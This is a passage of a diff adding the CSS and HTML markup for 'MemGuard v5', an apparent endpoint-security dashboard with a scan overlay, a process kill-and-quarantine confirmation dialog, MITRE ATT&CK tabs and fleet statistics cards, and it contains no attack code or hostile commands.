+        .edr-confirm-actions .btn-execute:hover {
+            background: linear-gradient(135deg, #dc2626, #b91c1c);
+            box-shadow: 0 6px 24px rgba(239, 68, 68, 0.5);
+            transform: translateY(-1px);
+        }
+
+        /* Simulation Controls Box */
+        .sim-control-panel {
+            background: rgba(11, 17, 31, 0.6);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-md);
+            padding: 1.1rem;
+            margin-top: 1.25rem;
+        }
+
+        .sim-form-row {
+            display: flex;
+            gap: 0.65rem;
+            align-items: center;
+            flex-wrap: wrap;
+            margin-top: 0.65rem;
+        }
+
+        select.custom-select {
+            background: var(--bg-input);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-sm);
+            color: var(--text-primary);
+            padding: 0.55rem 0.8rem;
+            font-size: 0.8rem;
+            font-family: inherit;
+            outline: none;
+            cursor: pointer;
+            flex: 1;
+            min-width: 220px;
+        }
+
+        /* HUD & Terminal */
+        .hud-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 0.75rem;
+            margin-bottom: 1.15rem;
+        }
+
+        .hud-stat-box {
+            background: rgba(11, 17, 31, 0.6);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-md);
+            padding: 0.8rem 0.95rem;
+        }
+
+        .hud-stat-label {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 0.2rem;
+        }
+
+        .hud-stat-value {
+            font-size: 1rem;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+
+        .hud-progress-track {
+            height: 4px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 2px;
+            margin-top: 0.4rem;
+            overflow: hidden;
+        }
+
+        .hud-progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent-cyan), var(--accent-blue));
+            border-radius: 2px;
+            transition: width 0.4s ease;
+        }
+
+        .terminal-box {
+            background: #05070d;
+            border: 1px solid rgba(56, 189, 248, 0.15);
+            border-radius: var(--radius-md);
+            height: 380px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .terminal-topbar {
+            background: rgba(15, 23, 42, 0.7);
+            padding: 0.45rem 0.8rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            font-size: 0.7rem;
+            color: var(--text-secondary);
+        }
+
+        .terminal-body {
+            padding: 0.8rem;
+            overflow-y: auto;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 0.35rem;
+            font-size: 0.74rem;
+        }
+
+        .terminal-entry {
+            display: flex;
+            align-items: baseline;
+            gap: 0.5rem;
+            line-height: 1.4;
+        }
+
+        .log-badge {
+            font-size: 0.65rem;
+            font-weight: 700;
+            padding: 0.1rem 0.4rem;
+            border-radius: 3px;
+            text-transform: uppercase;
+        }
+
+        .log-badge.info {
+            background: rgba(56, 189, 248, 0.15);
+            color: var(--accent-blue);
+        }
+
+        .log-badge.warning {
+            background: rgba(245, 158, 11, 0.15);
+            color: var(--accent-amber);
+        }
+
+        .log-badge.critical {
+            background: rgba(239, 68, 68, 0.2);
+            color: var(--accent-crimson);
+        }
+
+        /* Tables */
+        .table-responsive {
+            overflow-x: auto;
+            border-radius: var(--radius-md);
+            border: 1px solid var(--border-subtle);
+        }
+
+        table.soc-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.82rem;
+            text-align: left;
+        }
+
+        table.soc-table th {
+            background: rgba(15, 23, 42, 0.85);
+            padding: 0.75rem 0.9rem;
+            color: var(--text-secondary);
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 0.7rem;
+            letter-spacing: 0.05em;
+            border-bottom: 1px solid var(--border-subtle);
+        }
+
+        table.soc-table td {
+            padding: 0.7rem 0.9rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            color: var(--text-primary);
+        }
+
+        table.soc-table tr:hover td {
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        /* MITRE ATT&CK Matrix */
+        .mitre-grid {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 0.75rem;
+            margin-top: 0.75rem;
+        }
+
+        .mitre-column {
+            background: rgba(11, 17, 31, 0.6);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-md);
+            padding: 0.75rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.6rem;
+        }
+
+        .mitre-tactic-title {
+            font-size: 0.74rem;
+            font-weight: 700;
+            color: var(--accent-cyan);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.07);
+            padding-bottom: 0.4rem;
+        }
+
+        .mitre-technique-card {
+            background: rgba(15, 23, 42, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: var(--radius-sm);
+            padding: 0.55rem;
+            font-size: 0.72rem;
+            transition: var(--transition);
+        }
+
+        .mitre-technique-card.covered {
+            border-color: rgba(56, 189, 248, 0.35);
+            background: rgba(56, 189, 248, 0.05);
+        }
+
+        .mitre-technique-card.active-alert {
+            border-color: var(--accent-crimson);
+            background: rgba(239, 68, 68, 0.15);
+            color: #fee2e2;
+            box-shadow: 0 0 12px var(--danger-glow);
+            animation: pulse-threat 1.5s infinite alternate;
+        }
+
+        /* Radar Overlay */
+        .scan-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(5, 8, 16, 0.85);
+            backdrop-filter: blur(12px);
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .scan-overlay.active {
+            display: flex;
+        }
+
+        .radar-box {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            border: 2px solid rgba(0, 242, 254, 0.2);
+            position: relative;
+            box-shadow: 0 0 40px rgba(0, 242, 254, 0.15);
+            overflow: hidden;
+            margin-bottom: 1.25rem;
+        }
+
+        .radar-sweep {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: conic-gradient(from 0deg, rgba(0, 242, 254, 0.4) 0deg, transparent 60deg, transparent 360deg);
+            animation: radar-spin 1.4s linear infinite;
+        }
+
+        @keyframes radar-spin {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Search input */
+        .search-bar {
+            background: var(--bg-input);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-sm);
+            padding: 0.45rem 0.8rem;
+            color: var(--text-primary);
+            font-size: 0.8rem;
+            font-family: inherit;
+            outline: none;
+            width: 220px;
+            transition: var(--transition);
+        }
+
+        .search-bar:focus {
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 10px rgba(56, 189, 248, 0.2);
+        }
+
+        /* ========================================================= */
+        /* BLACK AND WHITE / MONOCHROME SOC MODE STYLES             */
+        /* ========================================================= */
+        body.theme-monochrome {
+            --bg-deep: #000000;
+            --bg-card: rgba(14, 14, 14, 0.96);
+            --bg-card-hover: rgba(24, 24, 24, 0.98);
+            --bg-input: #121212;
+            --border-subtle: #2d2d2d;
+            --border-glow: #737373;
+            --text-primary: #ffffff;
+            --text-secondary: #a1a1aa;
+            --text-muted: #71717a;
+            --accent-cyan: #ffffff;
+            --accent-blue: #e4e4e7;
+            --accent-emerald: #ffffff;
+            --accent-amber: #e4e4e7;
+            --accent-crimson: #ffffff;
+            --accent-purple: #d4d4d8;
+            --accent-indigo: #e4e4e7;
+            --danger-glow: rgba(255, 255, 255, 0.25);
+            --safe-glow: rgba(255, 255, 255, 0.2);
+            background-image:
+                radial-gradient(circle at 10% 15%, rgba(255, 255, 255, 0.05) 0%, transparent 40%),
+                radial-gradient(circle at 90% 85%, rgba(255, 255, 255, 0.03) 0%, transparent 45%),
+                linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+        }
+
+        body.theme-monochrome .brand-logo {
+            background: #171717;
+            border-color: #525252;
+            box-shadow: none;
+        }
+
+        body.theme-monochrome .brand-logo svg {
+            stroke: #ffffff;
+        }
+
+        body.theme-monochrome .btn-primary {
+            background: #ffffff;
+            color: #000000;
+            box-shadow: none;
+        }
+
+        body.theme-monochrome .btn-primary:hover {
+            background: #e4e4e7;
+        }
+
+        body.theme-monochrome .risk-badge.critical {
+            background: #ffffff;
+            color: #000000;
+            border-color: #ffffff;
+            box-shadow: none;
+            animation: none;
+        }
+
+        body.theme-monochrome .risk-badge.medium {
+            background: #3f3f46;
+            color: #ffffff;
+            border-color: #71717a;
+        }
+
+        body.theme-monochrome .risk-badge.low {
+            background: #27272a;
+            color: #ffffff;
+            border-color: #525252;
+        }
+
+        body.theme-monochrome .radar-box {
+            border-color: #71717a;
+            box-shadow: none;
+        }
+
+        body.theme-monochrome .radar-sweep {
+            background: conic-gradient(from 0deg, rgba(255, 255, 255, 0.4) 0deg, transparent 60deg, transparent 360deg);
+        }
+
+        body.theme-monochrome .mitre-technique-card.active-alert {
+            background: #ffffff !important;
+            color: #000000 !important;
+            border-color: #ffffff !important;
+            box-shadow: none !important;
+            animation: none !important;
+        }
+
+        body.theme-monochrome .mitre-technique-card.active-alert * {
+            color: #000000 !important;
+        }
+
+        body.theme-monochrome .threat-card {
+            border-color: #525252;
+        }
+
+        /* Pipeline & Architecture Flow Card Styles */
+        .pipeline-flow-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .pipe-stage-card {
+            background: rgba(14, 21, 38, 0.75);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-md);
+            padding: 1.15rem;
+            transition: var(--transition);
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .pipe-stage-card:hover,
+        .pipe-stage-card.active {
+            border-color: var(--border-glow);
+            transform: translateY(-2px);
+            background: var(--bg-card-hover);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+        }
+
+        .pipe-num-badge {
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(56, 189, 248, 0.12);
+            color: var(--accent-cyan);
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            font-size: 0.72rem;
+            font-weight: 700;
+            margin-bottom: 0.6rem;
+        }
+
+        /* ML Weight Meters */
+        .ml-weight-item {
+            margin-bottom: 0.75rem;
+        }
+
+        .ml-weight-header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.76rem;
+            margin-bottom: 0.25rem;
+        }
+
+        .ml-weight-bar-bg {
+            height: 6px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .ml-weight-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent-cyan), var(--accent-blue));
+            border-radius: 3px;
+            transition: width 0.4s ease;
+        }
+
+        /* ========================================================= */
+        /* DYNAMIC RESPONSIVE SCREEN ADJUSTMENTS FOR ALL DEVICES     */
+        /* ========================================================= */
+        /* Large Desktop / SOC Wall (>= 1440px) */
+        @media (min-width: 1440px) {
+            .app-container {
+                max-width: 1750px;
+                padding: 1.5rem 2rem 4rem 2rem;
+            }
+
+            .stat-grid {
+                grid-template-columns: repeat(4, 1fr);
+            }
+
+            .mitre-grid {
+                grid-template-columns: repeat(6, 1fr);
+            }
+        }
+
+        /* Standard Laptops & Small Desktops (1024px - 1439px) */
+        @media (max-width: 1399px) {
+            .workspace-grid {
+                grid-template-columns: 1.3fr 1fr;
+            }
+
+            .mitre-grid {
+                grid-template-columns: repeat(4, 1fr);
+            }
+        }
+
+        /* Tablets & Foldables (768px - 1023px) */
+        @media (max-width: 1023px) {
+            .stat-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 0.85rem;
+            }
+
+            .workspace-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .mitre-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+
+            .top-navbar {
+                padding: 0.9rem 1.1rem;
+            }
+
+            .hud-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        /* Mobile Phones & Handheld Terminals (<= 767px) */
+        @media (max-width: 767px) {
+            body {
+                padding: 0;
+            }
+
+            .app-container {
+                padding: 0.6rem 0.6rem 3rem 0.6rem;
+            }
+
+            .top-navbar {
+                flex-direction: column;
+                align-items: stretch;
+                padding: 0.85rem;
+                gap: 0.75rem;
+                border-radius: var(--radius-md);
+            }
+
+            .brand-section {
+                width: 100%;
+                justify-content: flex-start;
+            }
+
+            .brand-title h1 {
+                font-size: 1.15rem;
+            }
+
+            .telemetry-meta {
+                width: 100%;
+                justify-content: space-between;
+                gap: 0.4rem;
+            }
+
+            .meta-pill {
+                font-size: 0.68rem;
+                padding: 0.25rem 0.5rem;
+            }
+
+            .action-cluster {
+                width: 100%;
+                display: flex;
+                flex-wrap: wrap;
+                gap: 0.4rem;
+                justify-content: stretch;
+            }
+
+            .action-cluster .btn {
+                flex: 1 1 auto;
+                justify-content: center;
+                padding: 0.45rem 0.65rem;
+                font-size: 0.76rem;
+            }
+
+            .nav-tabs {
+                gap: 0.25rem;
+                padding-bottom: 0.4rem;
+                margin-bottom: 1rem;
+                scrollbar-width: none;
+            }
+
+            .nav-tabs::-webkit-scrollbar {
+                display: none;
+            }
+
+            .tab-btn {
+                padding: 0.45rem 0.75rem;
+                font-size: 0.76rem;
+                flex-shrink: 0;
+            }
+
+            .stat-grid {
+                grid-template-columns: 1fr;
+                gap: 0.75rem;
+            }
+
+            .stat-card {
+                padding: 1rem;
+            }
+
+            .stat-value {
+                font-size: 1.35rem;
+            }
+
+            .mitre-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .dossier-top {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .search-bar {
+                width: 100%;
+            }
+
+            .fleet-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .pipeline-flow-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .sim-form-row {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .sim-form-row .btn,
+            .sim-form-row select {
+                width: 100%;
+            }
+
+            .table-responsive {
+                border-radius: var(--radius-sm);
+                -webkit-overflow-scrolling: touch;
+            }
+
+            table.soc-table th,
+            table.soc-table td {
+                padding: 0.55rem 0.65rem;
+                font-size: 0.75rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Fullscreen Radar Scanner Modal -->
+    <div class="scan-overlay" id="scanOverlay">
+        <div class="radar-box">
+            <div class="radar-sweep"></div>
+        </div>
+        <h2 style="font-size: 1.25rem; font-weight: 700; color: #f8fafc; margin-bottom: 0.35rem;">
+            Deep Telemetry Sweep In Progress
+        </h2>
+        <p class="mono" style="font-size: 0.8rem; color: var(--accent-cyan);" id="scanProgressMsg">
+            Scanning PsUtil Memory Hooks & Sysmon Channels...
+        </p>
+    </div>
+
+    <!-- EDR Inline Confirmation Modal (replaces blocking confirm()) -->
+    <div class="edr-confirm-backdrop" id="edrConfirmBackdrop">
+        <div class="edr-confirm-box">
+            <div class="edr-confirm-icon">
+                <svg width="24" height="24" fill="none" stroke="#ef4444" stroke-width="2" viewBox="0 0 24 24">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+                    <line x1="12" y1="9" x2="12" y2="13"/>
+                    <line x1="12" y1="17" x2="12.01" y2="17"/>
+                </svg>
+            </div>
+            <div class="edr-confirm-title">&#x26A1; EDR Containment Action</div>
+            <div class="edr-confirm-subtitle">This will immediately kill the process and quarantine the threat from all active incident ledgers.</div>
+            <div class="edr-confirm-meta">
+                <div class="edr-confirm-meta-row">
+                    <span>TARGET</span>
+                    <strong id="edrConfirmProcName">&mdash;</strong>
+                </div>
+                <div class="edr-confirm-meta-row" style="margin-top:0.3rem;">
+                    <span>PID</span>
+                    <strong id="edrConfirmPid" style="color:#fbbf24;">&mdash;</strong>
+                    <span style="margin-left:auto;">ACTION</span>
+                    <strong style="color:#f87171;">KILL + QUARANTINE</strong>
+                </div>
+            </div>
+            <div class="edr-confirm-actions">
+                <button class="btn-cancel" id="edrConfirmCancel" onclick="closeEdrConfirm()">Cancel</button>
+                <button class="btn-execute" id="edrConfirmExecute">
+                    <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><polyline points="5 12 12 5 19 12"/><line x1="12" y1="19" x2="12" y2="5"/></svg>
+                    Terminate &amp; Quarantine
+                </button>
+            </div>
+        </div>
+    </div>
+
+
+        <!-- Top Navigation Bar -->
+        <header class="top-navbar">
+            <div class="brand-section">
+                <div class="brand-logo">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                    </svg>
+                </div>
+                <div class="brand-title">
+                    <h1>MemGuard v5 <span class="brand-badge">Multi-Device SOC</span></h1>
+                    <div class="brand-subtitle">Real-Time Threat Analysis & Cross-Device EDR Command</div>
+                </div>
+            </div>
+
+            <div class="telemetry-meta">
+                <div class="meta-pill">
+                    <div class="pulse-indicator ws-active" id="wsPulseIndicator"
+                        title="WebSocket Live Telemetry Stream Active"></div>
+                    <span id="wsStatusLabel">STREAM: <strong>LIVE WS</strong></span>
+                </div>
+                <div class="meta-pill">
+                    <span id="fleetSummaryPill">FLEET: <strong id="fleetTotalCount">5 DEVICES</strong></span>
+                </div>
+                <div class="meta-pill">
+                    <span id="uptimeClock" class="mono">UTC+ --:--:--</span>
+                </div>
+            </div>
+
+            <div class="action-cluster">
+                <button class="btn btn-outline" id="themeToggleBtn" onclick="toggleMonochromeTheme()"
+                    title="Toggle High-Contrast Black & White SOC Mode">
+                    ◐ B&W Mode
+                </button>
+                <a href="/backend" class="btn btn-outline" target="_blank"
+                    title="Open Backend Health & Telemetry Center">
+                    <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                        <rect x="2" y="2" width="20" height="8" rx="2" ry="2"></rect>
+                        <rect x="2" y="14" width="20" height="8" rx="2" ry="2"></rect>
+                        <line x1="6" y1="6" x2="6.01" y2="6"></line>
+                        <line x1="6" y1="18" x2="6.01" y2="18"></line>
+                    </svg>
+                    Backend HUD
+                </a>
+                <button class="btn btn-icon-only" id="audioToggleBtn" title="Toggle SOC Audio Synthesizer">
+                    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                        <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon>
+                        <path d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"></path>
+                    </svg>
+                </button>
+                <button class="btn btn-outline" onclick="generateAndShowReport()">
+                    <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                        <polyline points="14 2 14 8 20 8"></polyline>
+                        <line x1="16" y1="13" x2="8" y2="13"></line>
+                        <line x1="16" y1="17" x2="8" y2="17"></line>
+                        <polyline points="10 9 9 9 8 9"></polyline>
+                    </svg>
+                    Threat Report
+                </button>
+                <button class="btn btn-primary" onclick="triggerManualScan()">
+                    <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <line x1="22" y1="12" x2="18" y2="12"></line>
+                        <line x1="6" y1="12" x2="2" y2="12"></line>
+                        <line x1="12" y1="6" x2="12" y2="2"></line>
+                        <line x1="12" y1="22" x2="12" y2="18"></line>
+                    </svg>
+                    Run Deep Scan
+                </button>
+            </div>
+        </header>
+
+        <!-- Live Critical Incident Banner -->
+        <div class="threat-alert-banner" id="threatAlertBanner">
+            <div class="alert-left">
+                <div class="alert-icon-box">
+                    <svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                        <polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2">
+                        </polygon>
+                        <line x1="12" y1="8" x2="12" y2="12"></line>
+                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                    </svg>
+                </div>
+                <div class="alert-text">
+                    <h3 id="alertBannerHeadline">CRITICAL SECURITY ALERT: ACTIVE INCIDENT DETECTED</h3>
+                    <p id="alertBannerSub">Real-time telemetry flagged malicious activity across endpoint fleet mapped
+                        to MITRE ATT&CK.</p>
+                </div>
+            </div>
+            <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
+                <button class="btn btn-danger-outline" onclick="switchTab('fleet')">
+                    Inspect Device Fleet
+                </button>
+                <button class="btn btn-primary" onclick="generateAndShowReport()">
+                    View Real-Time Dossier
+                </button>
+            </div>
+        </div>
+
+        <!-- Adaptive System Scan Controller & Machine Baseline Toolbar -->
+        <div class="system-control-strip">
+            <div class="control-strip-left">
+                <div class="control-group">
+                    <span class="control-label mono">SCAN PROFILE:</span>
+                    <select id="scanModeSelect" class="control-select" onchange="onScanModeChanged()" title="Switch scan mode to adapt to any machine">
+                        <option value="standard" selected>🟢 Standard (Adaptive Baseline - All Systems)</option>
+                        <option value="deep">🔵 Deep Forensic Scan (Full Memory & Entropy)</option>
+                        <option value="strict">🟣 Strict Security Drill (Zero-Tolerance)</option>
+                    </select>
+                </div>
+                <div class="control-group">
+                    <span class="control-label mono">SENSITIVITY:</span>
+                    <select id="sensitivitySelect" class="control-select" onchange="onSensitivityChanged()" title="Tune anomaly sensitivity threshold">
+                        <option value="balanced" selected>Balanced SOC (Standard)</option>
+                        <option value="low">Low (Developer / Busy Workstation)</option>
+                        <option value="high">High Security</option>
+                        <option value="strict">Strict Lockdown</option>
+                    </select>
+                </div>
+            </div>
+            <div class="control-strip-right">
+                <span class="baseline-status-pill" id="baselineStatusPill" title="Baseline protects this computer from false-positive alerts">
+                    <span class="pulse-indicator ws-active"></span>
+                    <span id="baselineStatusText">System Baseline Active</span>
+                </span>
+                <button class="btn btn-outline" style="padding: 0.32rem 0.75rem; font-size: 0.76rem;" onclick="calibrateSystemBaselineUI()" title="Calibrate MemGuard to this specific computer's background processes">
+                    ⚡ Calibrate This System
+                </button>
+            </div>
+        </div>
+
+        <!-- Navigation Tabs -->
+        <nav class="nav-tabs">
+            <button class="tab-btn active" onclick="switchTab('overview')">
+                <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <rect x="3" y="3" width="7" height="7"></rect>
+                    <rect x="14" y="3" width="7" height="7"></rect>
+                    <rect x="14" y="14" width="7" height="7"></rect>
+                    <rect x="3" y="14" width="7" height="7"></rect>
+                </svg>
+                Operations Center
+            </button>
+            <button class="tab-btn" onclick="switchTab('fleet')">
+                <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <rect x="4" y="4" width="16" height="16" rx="2" ry="2"></rect>
+                    <rect x="9" y="9" width="6" height="6"></rect>
+                    <line x1="9" y1="1" x2="9" y2="4"></line>
+                    <line x1="15" y1="1" x2="15" y2="4"></line>
+                    <line x1="9" y1="20" x2="9" y2="23"></line>
+                    <line x1="15" y1="20" x2="15" y2="23"></line>
+                </svg>
+                Multi-Device Fleet
+                <span class="tab-badge" id="tabFleetBadge">5</span>
+            </button>
+            <button class="tab-btn" onclick="switchTab('architecture')">
+                <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline>
+                </svg>
+                Architecture & Pipeline
+            </button>
+            <button class="tab-btn" onclick="switchTab('ml-engine')">
+                <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <circle cx="12" cy="12" r="3"></circle>
+                    <path
+                        d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z">
+                    </path>
+                </svg>
+                ML Threat Rescorer
+            </button>
+            <button class="tab-btn" onclick="switchTab('reports')">
+                <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                    <polyline points="14 2 14 8 20 8"></polyline>
+                </svg>
+                Real-Time Reports
+            </button>
+            <button class="tab-btn" onclick="switchTab('detections')">
+                <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z">
+                    </path>
+                </svg>
+                Threat Detections
+                <span class="tab-badge" id="tabThreatBadge">0</span>
+            </button>
+            <button class="tab-btn" onclick="switchTab('mitre')">
+                <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <path d="M16 12l-4-4-4 4M12 16V9"></path>
+                </svg>
+                MITRE ATT&CK Matrix
+            </button>
+            <button class="tab-btn" onclick="switchTab('processes')">
+                <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <line x1="18" y1="20" x2="18" y2="10"></line>
+                    <line x1="12" y1="20" x2="12" y2="4"></line>
+                    <line x1="6" y1="20" x2="6" y2="14"></line>
+                </svg>
+                Process Explorer
+            </button>
+            <button class="tab-btn" onclick="switchTab('logs')">
+                <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <polyline points="4 17 10 11 4 5"></polyline>
+                    <line x1="12" y1="19" x2="20" y2="19"></line>
+                </svg>
+                SOC Event Log
+            </button>
+            <button class="tab-btn" onclick="switchTab('agent')">
+                <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <polyline points="16 18 22 12 16 6"></polyline>
+                    <polyline points="8 6 2 12 8 18"></polyline>
+                </svg>
+                Device Agent Setup
+            </button>
+        </nav>
+
+        <!-- KPI Metrics Ribbon -->
+        <div class="stat-grid">
+            <div class="stat-card risk-card" id="riskCard">
+                <div class="stat-header">
+                    <span class="stat-label">Enterprise Threat Posture</span>
+                    <div class="stat-icon" id="riskIcon">
+                        <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"
+                            viewBox="0 0 24 24">
+                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                        </svg>
+                    </div>
+                </div>
+                <div class="stat-value">
+                    <span class="risk-badge low" id="riskBadge">LOW SECURE</span>
+                </div>
+                <div class="stat-subtext">
+                    Threat Score: <strong id="riskScoreVal" class="mono">0 pts</strong> &bull; Composite Fleet Risk
+                </div>
+            </div>
+
+            <div class="stat-card">
+                <div class="stat-header">
+                    <span class="stat-label">Fleet Endpoints Monitored</span>
+                    <div class="stat-icon">
+                        <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"
+                            viewBox="0 0 24 24">
+                            <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
+                            <line x1="8" y1="21" x2="16" y2="21"></line>
+                            <line x1="12" y1="17" x2="12" y2="21"></line>
+                        </svg>
+                    </div>
+                </div>
+                <div class="stat-value mono" id="valFleetActive">5 / 5</div>
+                <div class="stat-subtext" id="fleetSubtext">
+                    Windows, Android, Linux, macOS, Web active
+                </div>
+            </div>
+
+            <div class="stat-card">
+                <div class="stat-header">
+                    <span class="stat-label">Live Local Procs Introspected</span>
+                    <div class="stat-icon">
+                        <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"
+                            viewBox="0 0 24 24">
+                            <rect x="2" y="2" width="20" height="8" rx="2" ry="2"></rect>
+                            <rect x="2" y="14" width="20" height="8" rx="2" ry="2"></rect>
+                        </svg>
+                    </div>
+                </div>
+                <div class="stat-value mono" id="valProcsCount">--</div>
+                <div class="stat-subtext">
+                    Host PsUtil memory walk + Sysmon operational
+                </div>
+            </div>
+
+            <div class="stat-card">
